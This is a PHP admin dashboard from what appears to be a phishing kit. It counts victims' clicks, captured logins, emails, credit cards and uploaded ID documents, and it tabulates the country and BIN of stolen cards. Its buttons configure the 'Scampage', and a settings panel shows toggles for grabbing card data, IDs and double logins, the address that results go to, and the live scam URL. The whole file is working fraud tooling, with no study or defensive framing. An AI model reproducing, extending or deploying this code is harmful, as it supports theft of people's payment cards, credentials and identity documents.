<?php
include'tod.php';
include'config.php';
error_reporting(0);
session_start();
include'session.php';
function count_c($filename) {
    $file = fopen($filename, "r");
    $total_click = fread($file, filesize($filename));
    $total_click = substr_count($total_click, "\n");
    return $total_click;
    fclose($file);
}
$total_click = count_c("../result/total_click.txt");
$total_bot = count_c("../result/total_bot.txt");
$total_email = count_c("../result/total_email.txt");
$total_logincc = count_c("../result/total_cclogin.txt");
$total_cc = count_c("../result/total_cc.txt");
$total_login = count_c("../result/total_login.txt");
$total_upload = count_c("../result/total_upload.txt");
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
  <link rel="apple-touch-icon" sizes="76x76" href="../assets/img/apple-icon.png">
  <link rel="icon" type="image/png" href="../assets/img/favicon.png">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
  <title><?= $judul; ?></title>
  <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no' name='viewport' />
  <!--     Fonts and icons     -->
  <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:400,700|Material+Icons" />
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
  <!-- CSS Files -->
  <link href="../assets/css/material-dashboard.css?v=2.1.0" rel="stylesheet" />
  <!-- CSS Just for demo purpose, don't include it in your project -->
  <link href="../assets/demo/demo.css" rel="stylesheet" />
  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
</head>

<body class="dark-edition">
  <?php include'header.php'; ?>
  <div class="wrapper ">
      <div class="content">
        <div class="container-fluid">
          <div class="row">
            <!-- TOD -->
            <!-- Total Click -->
            <div class="col-xl-3 col-lg-6 col-md-6 col-sm-6">
              <div class="card card-stats">
                <div class="card-header card-header-info card-header-icon">
                  <div class="card-icon">
                    <i class="material-icons">mouse</i>
                  </div>
                  <p class="card-category" style="color:white;">CLICK</p>
                  <h3 class="card-title" style="color:white;"><?php echo $total_click;?>
                  </h3>
                </div>
                <div class="card-footer">
                  <div class="stats">
                  </div>
                </div>
              </div>
            </div>
            <!-- Login -->
            <div class="col-xl-3 col-lg-6 col-md-6 col-sm-6">
              <div class="card card-stats">
                <div class="card-header card-header-info card-header-icon">
                  <div class="card-icon">
                    <i class="material-icons">login</i>
                  </div>
                  <p class="card-category" style="color:white;">LOGIN</p>
                  <h3 class="card-title" style="color:white;"><?php echo $total_login;?></h3>
                </div>
                <div class="card-footer">
                  <div class="stats">
                  </div>
                </div>
              </div>
            </div>
            <!-- Email -->
            <div class="col-xl-3 col-lg-6 col-md-6 col-sm-6">
              <div class="card card-stats">
                <div class="card-header card-header-info card-header-icon">
                  <div class="card-icon">
                    <i class="material-icons">email</i>
                  </div>
                  <p class="card-category" style="color:white;">EMAIL</p>
                  <h3 class="card-title" style="color:white;"><?php echo $total_email;?></h3>
                </div>
                <div class="card-footer">
                  <div class="stats">
                  </div>
                </div>
              </div>
            </div>
            <!-- CC -->
            <div class="col-xl-3 col-lg-6 col-md-6 col-sm-6">
              <div class="card card-stats">
                <div class="card-header card-header-info card-header-icon">
                  <div class="card-icon">
                    <i class="fa fa-credit-card"></i>
                  </div>
                  <p class="card-category" style="color:white;">CC</p>
                  <h3 class="card-title" style="color:white;"><?php echo $total_cc;?></h3>
                </div>
                <div class="card-footer">
                  <div class="stats">
                  </div>
                </div>
              </div>
            </div>
            <!-- Upload Pap -->
            <div class="col-xl-3 col-lg-6 col-md-6 col-sm-6">
              <div class="card card-stats">
                <div class="card-header card-header-info card-header-icon">
                  <div class="card-icon">
                    <i class="fa fa-id-badge"></i>
                  </div>
                  <p class="card-category" style="color:white;">PAP</p>
                  <h3 class="card-title" style="color:white;"><?php echo $total_upload;?></h3>
                </div>
                <div class="card-footer">
                  <div class="stats">
                  </div>
                </div>
              </div>
            </div>
            <!-- Total Bot -->
            <div class="col-xl-3 col-lg-6 col-md-6 col-sm-6">
              <div class="card card-stats">
                <div class="card-header card-header-info card-header-icon">
                  <div class="card-icon">
                    <i class="fa fa-bug"></i>
                  </div>
                  <p class="card-category" style="color:white;">BOT</p>
                  <h3 class="card-title" style="color:white;"><?php echo $total_bot;?>
                  </h3>
                </div>
                <div class="card-footer">
                  <div class="stats">
                  </div>
                </div>
              </div>
            </div>
            <!-- END TOD -->
            <!-- Tombol Kontol -->
            <button type="button" class="btn btn-danger btn-block" data-toggle="modal" data-target="#exampleModalLong"><i class="fa fa-eye"> </i> View Setting</button>
            <button type="button" class="btn btn-danger btn-block" onclick="window.location='setting.php'"><i class="fa fa-cogs"> </i> Setting Scampage</button>
            <button type="button" class="btn btn-danger btn-block" onclick="window.location='reset.php'"><i class="fa fa-trash-o"> </i> Reset Statistic</button>
            <br>
          </div>
          </div>
            <div class="row">
            <div class="col-lg-6 col-md-12">
              <div class="card">
                <div class="card-header card-header-info">
                  <h4 class="card-title">CC (<?php echo $total_cc;?>)</h4>
                </div>
                <div class="card-body table-responsive">
                  <table class="table table-hover">
                    <thead class="text-warning">
                      <th>COUNTRY</th>
                      <th>BIN</th>
                    </thead>
                    <tbody>
                      <?php
                      if(file_exists("../result/total_cclogin.txt")){
                      $bin = file_get_contents("../result/total_cclogin.txt");
                      $bin = explode("\n", $bin);
                      $counny = count($bin);
                      foreach($bin as $bins) {
                          $bins = explode("|", $bins);
                          $cn = $bins[0];
                          $cc = $bins[1];
                          if($cn == "") {

                          }else{
                          echo "<tr>
                          <td>".$cn."</td>
                          <td>".$cc."</td>
                          </tr>";
                          }
                          }
                      }else{
                          echo "<tr><td>Oops :(</td><td></td><td></td></tr>";
                      }
                      ?>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>
          </div>
          </div>
        </div>
      </div>
    </div>
  </div>
  <!--   Core JS Files   -->
  <script src="../assets/js/core/jquery.min.js"></script>
  <script src="../assets/js/core/popper.min.js"></script>
  <script src="../assets/js/core/bootstrap-material-design.min.js"></script>
  <script src="https://unpkg.com/default-passive-events"></script>
  <script src="../assets/js/plugins/perfect-scrollbar.jquery.min.js"></script>
  <!-- Place this tag in your head or just before your close body tag. -->
  <script async defer src="https://buttons.github.io/buttons.js"></script>
  <!--  Google Maps Plugin    -->
  <script src="https://maps.googleapis.com/maps/api/js?key=YOUR_KEY_HERE"></script>
  <!-- Chartist JS -->
  <script src="../assets/js/plugins/chartist.min.js"></script>
  <!--  Notifications Plugin    -->
  <script src="../assets/js/plugins/bootstrap-notify.js"></script>
  <!-- Control Center for Material Dashboard: parallax effects, scripts for the example pages etc -->
  <script src="../assets/js/material-dashboard.js?v=2.1.0"></script>
  <!-- Material Dashboard DEMO methods, don't include it in your project! -->
  <script src="../assets/demo/demo.js"></script>
  <script>
    $(document).ready(function() {
      $().ready(function() {
        $sidebar = $('.sidebar');

        $sidebar_img_container = $sidebar.find('.sidebar-background');

        $full_page = $('.full-page');

        $sidebar_responsive = $('body > .navbar-collapse');

        window_width = $(window).width();

        $('.fixed-plugin a').click(function(event) {
          // Alex if we click on switch, stop propagation of the event, so the dropdown will not be hide, otherwise we set the  section active
          if ($(this).hasClass('switch-trigger')) {
            if (event.stopPropagation) {
              event.stopPropagation();
            } else if (window.event) {
              window.event.cancelBubble = true;
            }
          }
        });

        $('.fixed-plugin .active-color span').click(function() {
          $full_page_background = $('.full-page-background');

          $(this).siblings().removeClass('active');
          $(this).addClass('active');

          var new_color = $(this).data('color');

          if ($sidebar.length != 0) {
            $sidebar.attr('data-color', new_color);
          }

          if ($full_page.length != 0) {
            $full_page.attr('filter-color', new_color);
          }

          if ($sidebar_responsive.length != 0) {
            $sidebar_responsive.attr('data-color', new_color);
          }
        });

        $('.fixed-plugin .background-color .badge').click(function() {
          $(this).siblings().removeClass('active');
          $(this).addClass('active');

          var new_color = $(this).data('background-color');

          if ($sidebar.length != 0) {
            $sidebar.attr('data-background-color', new_color);
          }
        });

        $('.fixed-plugin .img-holder').click(function() {
          $full_page_background = $('.full-page-background');

          $(this).parent('li').siblings().removeClass('active');
          $(this).parent('li').addClass('active');


          var new_image = $(this).find("img").attr('src');

          if ($sidebar_img_container.length != 0 && $('.switch-sidebar-image input:checked').length != 0) {
            $sidebar_img_container.fadeOut('fast', function() {
              $sidebar_img_container.css('background-image', 'url("' + new_image + '")');
              $sidebar_img_container.fadeIn('fast');
            });
          }

          if ($full_page_background.length != 0 && $('.switch-sidebar-image input:checked').length != 0) {
            var new_image_full_page = $('.fixed-plugin li.active .img-holder').find('img').data('src');

            $full_page_background.fadeOut('fast', function() {
              $full_page_background.css('background-image', 'url("' + new_image_full_page + '")');
              $full_page_background.fadeIn('fast');
            });
          }

          if ($('.switch-sidebar-image input:checked').length == 0) {
            var new_image = $('.fixed-plugin li.active .img-holder').find("img").attr('src');
            var new_image_full_page = $('.fixed-plugin li.active .img-holder').find('img').data('src');

            $sidebar_img_container.css('background-image', 'url("' + new_image + '")');
            $full_page_background.css('background-image', 'url("' + new_image_full_page + '")');
          }

          if ($sidebar_responsive.length != 0) {
            $sidebar_responsive.css('background-image', 'url("' + new_image + '")');
          }
        });

        $('.switch-sidebar-image input').change(function() {
          $full_page_background = $('.full-page-background');

          $input = $(this);

          if ($input.is(':checked')) {
            if ($sidebar_img_container.length != 0) {
              $sidebar_img_container.fadeIn('fast');
              $sidebar.attr('data-image', '#');
            }

            if ($full_page_background.length != 0) {
              $full_page_background.fadeIn('fast');
              $full_page.attr('data-image', '#');
            }

            background_image = true;
          } else {
            if ($sidebar_img_container.length != 0) {
              $sidebar.removeAttr('data-image');
              $sidebar_img_container.fadeOut('fast');
            }

            if ($full_page_background.length != 0) {
              $full_page.removeAttr('data-image', '#');
              $full_page_background.fadeOut('fast');
            }

            background_image = false;
          }
        });

        $('.switch-sidebar-mini input').change(function() {
          $body = $('body');

          $input = $(this);

          if (md.misc.sidebar_mini_active == true) {
            $('body').removeClass('sidebar-mini');
            md.misc.sidebar_mini_active = false;

            $('.sidebar .sidebar-wrapper, .main-panel').perfectScrollbar();

          } else {

            $('.sidebar .sidebar-wrapper, .main-panel').perfectScrollbar('destroy');

            setTimeout(function() {
              $('body').addClass('sidebar-mini');

              md.misc.sidebar_mini_active = true;
            }, 300);
          }

          // we simulate the window Resize so the charts will get updated in realtime.
          var simulateWindowResize = setInterval(function() {
            window.dispatchEvent(new Event('resize'));
          }, 180);

          // we stop the simulation of Window Resize after the animations are completed
          setTimeout(function() {
            clearInterval(simulateWindowResize);
          }, 1000);

        });
      });
    });
  </script>
  <script>
    $(document).ready(function() {
      // Javascript method's body can be found in assets/js/demos.js
      md.initDashboardPageCharts();

    });
  </script>
  <!-- Modal -->
        <div class="modal fade" id="exampleModalLong" tabindex="-1" role="dialog" aria-labelledby="exampleModalLongTitle" aria-hidden="true">
        <div class="modal-dialog" role="document">
            <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title" id="exampleModalLongTitle"> View Setting</h3>
                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                <span aria-hidden="true">&times;</span>
                </button>
            </div>
            <div class="modal-body">
              <div style="background-color: black;border-radius: 10px;height: auto;">
                <b style="padding-left: 10px;color: white;">EMAIL RESULT:</b><br>
                <b style="padding-left: 10px;color: white;"><?php echo $result_anying; ?></b>
              </div><br>
              <div style="background-color: black;border-radius: 10px;height: auto;">
                <b style="padding-left: 10px;color: white;">PARAMETER:</b><br>
                <b style="padding-left: 10px;color: white;"><?php echo $param_akses; ?></b>
              </div><br>
              <div style="background-color: black;border-radius: 10px;height: auto;">
                <b style="padding-left: 10px;color: white;">DOUBLE LOGIN:</b><br>
                <b style="padding-left: 10px;color: white;"><?php echo $config['two_login']; ?></b>
              </div><br>
              <div style="background-color: black;border-radius: 10px;height: auto;">
                <b style="padding-left: 10px;color: white;">DOUBLE CC:</b><br>
                <b style="padding-left: 10px;color: white;"><?php echo $config['two_cc']; ?></b>
              </div><br>
              <div style="background-color: black;border-radius: 10px;height: auto;">
                <b style="padding-left: 10px;color: white;">GET CC:</b><br>
                <b style="padding-left: 10px;color: white;"><?php echo $config['get_cc']; ?></b>
              </div><br>
              <div style="background-color: black;border-radius: 10px;height: auto;">
                <b style="padding-left: 10px;color: white;">GET PAP:</b><br>
                <b style="padding-left: 10px;color: white;"><?php echo $config['get_pap']; ?></b>
              </div><br>
              <div style="background-color: black;border-radius: 10px;height: auto;">
                <b style="padding-left: 10px;color: white;">GET EMAIL:</b><br>
                <b style="padding-left: 10px;color: white;"><?php echo $config['get_email']; ?></b>
              </div><br>
              <div style="background-color: black;border-radius: 10px;height: auto;">
                <b style="padding-left: 10px;color: white;">SEND RESULT USING:</b><br>
                <b style="padding-left: 10px;color: white;"><?php echo $config['send_login']; ?></b>
              </div><br>
              <div style="background-color: black;border-radius: 10px;height: auto;">
                <b style="padding-left: 10px;color: white;">Your Scampage:</b><br>
                <b style="padding-left: 10px;color: white;">
                  <?php
                  if ($config['site_param_on'] == "on") {
                  ?>
                  <a href="https://<?php echo $_SERVER['SERVER_NAME']; ?>/?<?php echo $param_akses; ?>" target="_blank">https://<?php echo $_SERVER['SERVER_NAME']; ?>/?<?php echo $param_akses; ?></a>
                  <?php }else{ ?>
                  <a href="https://<?php echo $_SERVER['SERVER_NAME']; ?>" target="_blank">https://<?php echo $_SERVER['SERVER_NAME']; ?></a>
                  <?php } ?>
                </b>
              </div>
            </div>
            </div>
        </div>
        </div>
  <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
</body>
</html>